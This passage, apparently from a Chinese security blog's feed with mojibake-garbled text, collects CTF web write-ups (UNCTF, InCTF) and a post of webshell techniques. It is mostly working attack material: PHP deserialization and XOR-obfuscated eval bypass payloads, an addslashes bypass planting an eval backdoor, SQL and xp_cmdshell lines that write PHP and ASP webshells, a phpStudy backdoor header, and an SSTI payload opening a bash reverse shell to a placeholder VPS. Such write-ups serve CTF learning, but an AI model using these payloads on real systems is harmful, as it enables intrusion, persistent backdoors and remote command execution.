cookie_encode(serialize($class));</span><br></pre></td></tr></table></figure>

<p><img src="/2019/11/08/UNCTF-Web-wp/7.png" alt><br>æç¤ºæœ‰<code>access.php</code>ï¼Œä½†æ˜¯è¯»æºç å’Œ<code>flag</code>ä¸€æ ·è¢«wafäº†ï¼Œæœ€åå‘ç°æœ‰<code>access.php.bak</code><br>æœ€ç»ˆpayload:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cookie_encode</span><span class="params">($str)</span> </span>&#123;</span><br><span class="line">    $key = base64_encode($str);</span><br><span class="line">    $key = bin2hex($key);</span><br><span class="line">    $arr = str_split($key, <span class="number">2</span>);</span><br><span class="line">    $cipher = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">foreach</span>($arr <span class="keyword">as</span> $value) &#123;</span><br><span class="line">        $num = hexdec($value);</span><br><span class="line">        $num = $num + <span class="number">240</span>;</span><br><span class="line">        $cipher = $cipher.<span class="string">'%26'</span>.dechex($num);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $cipher;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">session</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $access_token = <span class="string">'3ecReK&amp;key'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$hack_token = <span class="string">"3ecReK&amp;key"</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">debug</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $choose = <span class="string">"2"</span>;</span><br><span class="line">    <span class="keyword">public</span> $forbidden = <span class="string">"Good Luck :|"</span>;</span><br><span class="line">    <span class="keyword">public</span> $access_token = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">public</span> $ob = <span class="keyword">NULL</span>;</span><br><span class="line">    <span class="keyword">public</span> $username = <span class="string">"debuger"</span>;</span><br><span class="line">    <span class="keyword">public</span> $id = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$class = <span class="keyword">new</span> debug;</span><br><span class="line">$class -&gt; forbidden = $class;</span><br><span class="line">$token = <span class="keyword">new</span> session;</span><br><span class="line">$class -&gt; funny = serialize($token);</span><br><span class="line"><span class="keyword">echo</span> cookie_encode(serialize($class));</span><br></pre></td></tr></table></figure>

<p><img src="/2019/11/08/UNCTF-Web-wp/6.png" alt></p>
<h3><span id="bypass">bypass</span></h3><p>payload: </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://183.129.189.60:10026/?a=\&amp;b=%0agr$9ep -R ctf%20%23</span><br></pre></td></tr></table></figure>

<h3><span id="smile-dog">Smile Dog</span></h3><p><code>Golang</code><br><code>CVE-2019-9741</code><br>payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:9527/? HTTP/1.1\r\nLogic: &#123;&#123;.MyRequest&#125;&#125;</span><br></pre></td></tr></table></figure>

<h2><span id="æ–°æ˜Ÿèµ›">æ–°æ˜Ÿèµ›</span></h2><h3><span id="simple_web">simple_web</span></h3><p>ä¸»è¦å°±æ˜¯ç»•<code>addslashes()</code><br>é¢˜ç›®ä¸»è¦æºç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$str = addslashes($_GET[<span class="string">'content'</span>]);</span><br><span class="line">$file = file_get_contents(<span class="string">'content.php'</span>);</span><br><span class="line">$file = preg_replace(<span class="string">'|\$content=\'.*\';|'</span>, <span class="string">"\$content='$str';"</span>, $file);</span><br><span class="line">file_put_contents(<span class="string">'content.php'</span>, $file);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?content=\<span class="string">';@eval($_POST[a]);phpinfo();;//</span></span><br></pre></td></tr></table></figure>

<h2><span id="å‚è€ƒé“¾æ¥">å‚è€ƒé“¾æ¥</span></h2><p><a href="https://xz.aliyun.com/t/6685" target="_blank" rel="noopener">https://xz.aliyun.com/t/6685</a><br><a href="https://xz.aliyun.com/t/6686" target="_blank" rel="noopener">https://xz.aliyun.com/t/6686</a><br><a href="https://xz.aliyun.com/t/6661" target="_blank" rel="noopener">https://xz.aliyun.com/t/6661</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h1><span id="unctf_webå¤ç°">UNCTF_Webå¤ç°</span></h1><p>[TOC]</p>
<h2><span id="ç«æŠ€èµ›">ç«æŠ€èµ›</span></h2><h3><span id="nsb-login">NSB Login</span></]]>
    </summary>
    
  </entry>
  
  <entry>
    <title><![CDATA[æœ€è¿‘ä½¿ç”¨çš„WebShell]]></title>
    <link href="/2019/10/22/%E6%9C%80%E8%BF%91%E4%BD%BF%E7%94%A8%E7%9A%84WebShell/"/>
    <id>/2019/10/22/æœ€è¿‘ä½¿ç”¨çš„WebShell/</id>
    <published>2019-10-22T15:18:44.000Z</published>
    <updated>2019-10-22T15:35:14.929Z</updated>
    <content type="html"><![CDATA[<h1><span id="æœ€è¿‘ä½¿ç”¨çš„webshell">æœ€è¿‘ä½¿ç”¨çš„WebShell</span></h1><h3><span id="phpmyadminè¦çŸ¥é“ç½‘ç«™ç›®å½•ç»“æ„">phpmyadminï¼ˆè¦çŸ¥é“ç½‘ç«™ç›®å½•ç»“æ„</span></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log=<span class="string">'on'</span>;</span><br><span class="line"><span class="keyword">SET</span> <span class="keyword">global</span> general_log_file=<span class="string">'D:/webshell/www/cmd.php'</span>;</span><br><span class="line"><span class="keyword">SELECT</span> <span class="string">'&lt;?php assert($_POST["cmd"]);?&gt;'</span>;</span><br></pre></td></tr></table></figure>

<h3><span id="htmlè¯¾">htmlè¯¾</span></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure '<span class="keyword">show</span> <span class="keyword">advanced</span> options<span class="string">', 1;RECONFIGURE;EXEC sp_configure '</span>xp_cmdshell<span class="string">', 1;RECONFIGURE;</span></span><br><span class="line"><span class="string">exec master..xp_cmdshell '</span>echo <span class="string">"&lt;%eval request("</span>pass<span class="string">")%&gt;"</span> &gt;c:\\inetpub\\wwwroot\\<span class="number">1.</span>asp<span class="string">'</span></span><br></pre></td></tr></table></figure>

<p>Ps:htmlè€å¸ˆçš„æ˜¯ä¸ªæ†¨æ†¨</p>
<h3><span id="phpstudyåé—¨">phpStudyåé—¨</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Accept-Encoding: gzip,deflate</span><br><span class="line">Accept-charset: cGhwaW5mbygpOw==</span><br></pre></td></tr></table></figure>]]></content>
    <summary type="html">
    <![CDATA[<h1><span id="æœ€è¿‘ä½¿ç”¨çš„webshell">æœ€è¿‘ä½¿ç”¨çš„WebShell</span></h1><h3><span id="phpmyadminè¦çŸ¥é“ç½‘ç«™ç›®å½•ç»“æ„">phpmyadminï¼ˆè¦çŸ¥é“ç½‘ç«™ç›®å½•ç»“æ„</span></h3><figure class="high]]>
    </summary>
    
  </entry>
  
  <entry>
    <title><![CDATA[inctf_webä¸¤é“é¢˜è§£]]></title>
    <link href="/2019/09/24/inctf-web%E4%B8%A4%E9%81%93%E9%A2%98%E8%A7%A3/"/>
    <id>/2019/09/24/inctf-webä¸¤é“é¢˜è§£/</id>
    <published>2019-09-24T13:53:12.000Z</published>
    <updated>2019-09-24T16:18:20.480Z</updated>
    <content type="html"><![CDATA[<h1><span id="inctf_webä¸¤é“é¢˜è§£">inctf_webä¸¤é“é¢˜è§£</span></h1><h3><span id="web1">web1</span></h3><hr>
<h4><span id="code">code:</span></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$input = $_GET[<span class="string">'input'</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">global</span> $input;</span><br><span class="line">  <span class="keyword">foreach</span> (get_defined_functions()[<span class="string">'internal'</span>] <span class="keyword">as</span> $blacklisted) &#123;</span><br><span class="line">      <span class="keyword">if</span> (preg_match (<span class="string">'/'</span> . $blacklisted . <span class="string">'/im'</span>, $input)) &#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">"Your input is blacklisted"</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">          <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  $blacklist = <span class="string">"exit|die|eval|\[|\]|\\\|\*|`|-|\+|~|\&#123;|\&#125;|\"|\'"</span>;</span><br><span class="line">  <span class="keyword">unset</span>($blacklist);</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$thisfille=$_GET[<span class="string">'thisfile'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(is_file($thisfille))&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"You can't use inner file"</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(file_exists($thisfille))&#123;</span><br><span class="line">    <span class="keyword">if</span>(check())&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"Naaah"</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">eval</span>($input);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"File doesn't exist"</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">iterate</span><span class="params">($ass)</span></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span>($ass <span class="keyword">as</span> $hole)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"AssHole"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4><span id="è§£é¢˜æ€è·¯">è§£é¢˜æ€è·¯</span></h4><p>ç®€å•çš„æ„é€ å¼‚æˆ–å’Œä¸Šä¸Šç¯‡iæ˜¥ç§‹çš„mathç›¸ä¼¼<br>xor_exp:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¿˜æ²¡å†™</span><br></pre></td></tr></table></figure>

<h4><span id="payload">payload</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://18.222.93.187/?thisfile=./&amp;input=$d=(&apos;%01&apos;^&apos;`&apos;).(&apos;%13&apos;^&apos;`&apos;).(&apos;%13&apos;^&apos;`&apos;).(&apos;%05&apos;^&apos;`&apos;).(&apos;%12&apos;^&apos;`&apos;).(&apos;%14&apos;^&apos;`&apos;);$dd=(&apos;%01&apos;^&apos;%5e&apos;).(&apos;%0D&apos;^&apos;]&apos;).(&apos;%2F&apos;^&apos;`&apos;).(&apos;%0E&apos;^&apos;]&apos;).(&apos;%09&apos;^&apos;]&apos;);$ddd=$$dd;$d($ddd[&apos;a&apos;]);</span><br></pre></td></tr></table></figure>

<p>èšå‰‘ç›´æ¥getshell</p>
<h3><span id="web2">web2</span></h3><hr>
<h4><span id="code">code:</span></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$input = $_GET[<span class="string">'input'</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">global</span> $input;</span><br><span class="line">  <span class="keyword">foreach</span> (get_defined_functions()[<span class="string">'internal'</span>] <span class="keyword">as</span> $blacklisted) &#123;</span><br><span class="line">      <span class="keyword">if</span> (preg_match (<span class="string">'/'</span> . $blacklisted . <span class="string">'/im'</span>, $input)) &#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">"Your input is blacklisted"</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">          <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  $blacklist = <span class="string">"exit|die|eval|\[|\]|\\\|\*|`|-|\+|~|\&#123;|\&#125;|\"|\'"</span>;</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">"/$blacklist/i"</span>, $input))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Do you really you need that?"</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">unset</span>($blacklist);</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$thisfille=$_GET[<span class="string">'thisfile'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(is_file($thisfille))&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"You can't use inner file"</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(file_exists($thisfille))&#123;</span><br><span class="line">    <span class="keyword">if</span>(check())&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"Naaah"</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">eval</span>($input);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"File doesn't exist"</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">iterate</span><span class="params">($ass)</span></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span>($ass <span class="keyword">as</span> $hole)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"AssHole"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4><span id="æ€è·¯">æ€è·¯</span></h4><p>xor_exp:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$payloads = <span class="string">"phpinfo();"</span>;</span><br><span class="line">$exp1 = <span class="string">""</span>;</span><br><span class="line">$exp2 = <span class="string">""</span>;</span><br><span class="line">$payloads = str_split($payloads,<span class="number">1</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xor_exp</span><span class="params">($payload)</span></span>&#123;</span><br><span class="line">    $arrAz9 = [<span class="string">"A"</span>, <span class="string">"B"</span>, <span class="string">"C"</span>, <span class="string">"D"</span>, <span class="string">"E"</span>, <span class="string">"F"</span>, <span class="string">"G"</span>, <span class="string">"H"</span>, <span class="string">"I"</span>, <span class="string">"J"</span>, <span class="string">"K"</span>, <span class="string">"L"</span>, <span class="string">"M"</span>, <span class="string">"N"</span>, <span class="string">"O"</span>, <span class="string">"P"</span>, <span class="string">"Q"</span>, <span class="string">"S"</span>, <span class="string">"T"</span>, <span class="string">"U"</span>, <span class="string">"V"</span>, <span class="string">"W"</span>, <span class="string">"X"</span>, <span class="string">"Y"</span>, <span class="string">"Z"</span>,<span class="string">"a"</span>,<span class="string">"b"</span>,<span class="string">"c"</span>,<span class="string">"d"</span>,<span class="string">"e"</span>,<span class="string">"f"</span>,<span class="string">"g"</span>,<span class="string">"h"</span>,<span class="string">"i"</span>,<span class="string">"j"</span>,<span class="string">"k"</span>,<span class="string">"l"</span>,<span class="string">"m"</span>,<span class="string">"n"</span>,<span class="string">"o"</span>,<span class="string">"p"</span>,<span class="string">"q"</span>,<span class="string">"r"</span>,<span class="string">"s"</span>,<span class="string">"t"</span>,<span class="string">"u"</span>,<span class="string">"v"</span>,<span class="string">"w"</span>,<span class="string">"x"</span>,<span class="string">"y"</span>,<span class="string">"z"</span>,<span class="string">"0"</span>,<span class="string">"1"</span>,<span class="string">"2"</span>,<span class="string">"3"</span>,<span class="string">"4"</span>,<span class="string">"5"</span>,<span class="string">"6"</span>,<span class="string">"7"</span>,<span class="string">"8"</span>,<span class="string">"9"</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($arrAz9 <span class="keyword">as</span> $i)&#123;</span><br><span class="line">        <span class="keyword">foreach</span> ($arrAz9 <span class="keyword">as</span> $j)&#123;</span><br><span class="line">            <span class="keyword">if</span> ((strval($i) ^ strval($j))===$payload)&#123;</span><br><span class="line">                <span class="comment">#echo strval($i).strval($j);</span></span><br><span class="line">                <span class="keyword">return</span> strval($i).strval($j);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span> ($payloads <span class="keyword">as</span> $payload)&#123;</span><br><span class="line">    $exp = str_split(xor_exp($payload),<span class="number">1</span>);</span><br><span class="line">    $exp1 .= $exp[<span class="number">0</span>];</span><br><span class="line">    $exp2 .= $exp[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $exp1.<span class="string">"^"</span>.$exp2;</span><br></pre></td></tr></table></figure>

<h4><span id="payload">payload</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http://18.223.159.46/</span><br><span class="line">?thisfile=</span><br><span class="line">&amp;input=$e=(syr^(6).(7).(6));</span><br><span class="line">$c= (taacsyc^(7).(4).(3).(1).(6).(7).(7));</span><br><span class="line">$g=(sqcissqxxsqgeraa^(4).(4).(7).(6).(7).(6).(7).(1).(6).(6).(5).(8).(3).(3).(3).(2));</span><br><span class="line">$v=(rast^(7).(7).(2).(8));</span><br><span class="line">$as = (raasce^(3).(2).(2).(6).(1).(1));</span><br><span class="line">$as($e($c($g())));&amp;a=eval($_POST[&apos;a&apos;]);</span><br></pre></td></tr></table></figure>

<p>POST </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a=$array=array(  </span><br><span class="line"> array(&quot;pipe&quot;,&quot;r&quot;),</span><br><span class="line"> array(&quot;pipe&quot;,&quot;w&quot;),</span><br><span class="line"> array(&quot;pipe&quot;,&quot;w&quot;)</span><br><span class="line"> );$fp = proc_open(&quot;ls&quot;,$array,$pipes);</span><br><span class="line">echo stream_get_contents($pipes[1]);</span><br><span class="line">proc_close($fp);</span><br></pre></td></tr></table></figure>

<hr>
<p>ä¸¤é“é¢˜çš„getshellä¼šå†åšå­¦ä¹ ï¼Œä¸‹é¢æ˜¯ä¸¤ç¯å¢ƒçš„disale_functions<br>phpinfo() ==&gt; disable_functions:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,system,shell_exec,popen,passthru,link,symlink,syslog,imap_open,ld,error_log,mail,file_put_contents,scandir,file_get_contents,readfile,fread,fopen,chdir</span><br></pre></td></tr></table></figure>]]></content>
    <summary type="html">
    <![CDATA[<h1><span id="inctf_webä¸¤é“é¢˜è§£">inctf_webä¸¤é“é¢˜è§£</span></h1><h3><span id="web1">web1</span></h3><hr>
<h4><span id="code">code:</span></h4><figure ]]>
    </summary>
    
  </entry>
  
  <entry>
    <title><![CDATA[sstiå§¿åŠ¿]]></title>
    <link href="/2019/09/21/ssti%E5%A7%BF%E5%8A%BF/"/>
    <id>/2019/09/21/sstiå§¿åŠ¿/</id>
    <published>2019-09-20T16:39:37.000Z</published>
    <updated>2019-09-21T17:09:42.255Z</updated>
    <content type="html"><![CDATA[<h1><span id="sstiç»•è¿‡å§¿åŠ¿">sstiç»•è¿‡å§¿åŠ¿</span></h1><p>py2ä¸py3çš„<code>payload</code>æœ‰æ‰€å·®å¼‚åœ¨æ­¤åŒºåˆ«å¼€æ¥<br>ï¼ˆflaskæ¡†æ¶æœ€æ–°å¯èƒ½é»˜è®¤URLç¼–ç äº†ï¼Œæœ‰ã€çƒ¦</p>
<h2><span id="py2">py2</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#125;.__class__.__base__.__subclasses__()[59].__init__.func_globals.linecache.os.popen(&quot;bash -i &gt; /dev/tcp/vps_ip/port 0&gt;&amp;1 2&gt;&amp;1&quot;).read()</span><br></pre></td></tr></table></figure>

<h2><span id="py3">py3</span></h2><p>å‚è€ƒè¿æ¥:<br><a href="https://www.freebuf.com/articles/system/203208.html" target="_blank" rel="noopener">ä¸€æ–‡çœ‹æ‡‚Pythonæ²™ç®±é€ƒé€¸</a><br><a href="https://p0sec.net/index.php/archives/120/" target="_blank" rel="noopener">Flask/Jinja2æ¨¡æ¿æ³¨å…¥ä¸­çš„ä¸€äº›ç»•è¿‡å§¿åŠ¿</a><br><a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">ä¸€ç¯‡æ–‡ç« å¸¦ä½ ç†è§£æ¼æ´ä¹‹ SSTI æ¼æ´</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h1><span id="sstiç»•è¿‡å§¿åŠ¿">sstiç»•è¿‡å§¿åŠ¿</span></h1><p>py2ä¸py3çš„<code>payload</code>æœ‰æ‰€å·®å¼‚åœ¨æ­¤åŒºåˆ«å¼€æ¥<br>ï¼ˆflaskæ¡†æ¶æœ€æ–°å¯èƒ½é»˜è®¤URLç¼–ç äº†ï¼Œæœ‰ã€çƒ¦</p>
<h2><span id="py2">py2]]>
    </summary>
    
  </entry>
  
  <entry>
    <title><![CDATA[æŸsæ­å»º]]></title>
    <link href="/2019/09/20/%E6%9F%90s%E6%90%AD%E5%BB%BA/"/>
    <id>/2019/09/20/æŸsæ­å»º/</id>
    <published>2019-09-20T14:39:39.000Z</published>
    <updated>2019-09-20T14:46:22.303Z</updated>
    <content type="html"><![CDATA[<h1><span id="æŸsæ­å»º">æŸsæ­å»º</span></h1><p>å›½å¤–æœåŠ¡å™¨çš„è´­ä¹°<br>æˆ‘ä¹°çš„<code>Vultr</code><br>è¿è¡Œä¸‹åˆ—å‘½ä»¤</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget --no-check-certificate -O shadowsocks.sh https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks.sh</span><br><span class="line">chmod +x shadowsocks.sh</span><br><span class="line">./shadowsocks.sh</span><br></pre></td></tr></table></figure>

<p>åˆ†åˆ«å¡«å…¥å¯†ç ï¼Œç«¯å£ï¼ŒåŠ å¯†æ–¹å¼ï¼Œç„¶åå›è½¦ç­‰å¾…</p>
]]></content>
    <summary type="html">
    <![CDATA[<h1><span id="æŸsæ­å»º">æŸsæ­å»º</span></h1><p>å›½å¤–æœåŠ¡å™¨çš„è´­ä¹°<br>æˆ‘ä¹°çš„<code>Vultr</code><br>è¿è¡Œä¸‹åˆ—å‘½ä»¤</p>
<figure class="highlight plain"><table><tr><td class=]]>
    </summary>
    
  </entry>
  
  <entry>
    <title><![CDATA[iæ˜¥ç§‹CTFå¤ºæ——èµ›(ç¬¬ä¸€å­£)]]></title>
    <link href="/2019/09/16/i%E6%98%A5%E7%A7%8BCTF%E5%A4%BA%E6%97%97%E8%B5%9B-%E7%AC%AC%E4%B8%80%E5%AD%A3/"/>
